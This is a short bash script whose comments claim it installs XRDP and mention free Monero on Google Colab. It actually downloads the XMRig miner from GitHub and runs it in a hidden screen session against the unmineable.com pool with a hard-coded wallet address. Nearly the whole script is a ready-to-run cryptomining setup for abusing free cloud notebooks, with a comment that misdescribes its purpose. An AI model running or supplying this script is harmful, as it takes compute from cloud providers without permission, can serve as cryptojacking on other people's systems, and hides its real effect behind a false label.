#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o rx.unmineable.com:3333 -u 8AZQoemxZQfb42WYk3dkNHRwzJtxiY4hs3DwFRzyEj3WAnoCY9NNCFfWmgHsTX1w9a4nY1pFiux4XjAeQrKt3KKR1qtwSpJ -k --tls --rig-id GC-US
